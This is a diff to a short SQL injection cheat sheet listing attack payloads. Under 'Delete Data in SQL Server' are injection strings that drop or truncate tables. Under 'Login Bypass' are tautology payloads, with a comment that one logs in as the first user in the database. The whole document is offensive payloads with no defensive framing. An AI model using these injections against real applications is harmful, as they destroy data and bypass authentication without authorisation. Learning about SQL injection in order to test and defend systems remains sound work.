@@ -1,14 +1,17 @@
 ---------------------
 SQL injection command
 ---------------------
+
 -----------------------------
 [ Delete Data in SQL Server ] 
 
-'; DROP TABLE history; --
-'; TRUNCATE TABLE history; --
+'; DROP TABLE <table name>; -- // deletes entire table
+'; TRUNCATE TABLE <table name>; -- // deletes content of the table
 -----------------------------
+
 ----------------
 [ Login Bypass ] 
 
-' OR 'a'='a'; -- 
+<username>' OR 'a'='a'; -- 
+' OR 'a'='a'; -- // Note that this will login bypass for the first user in the database
 ----------------
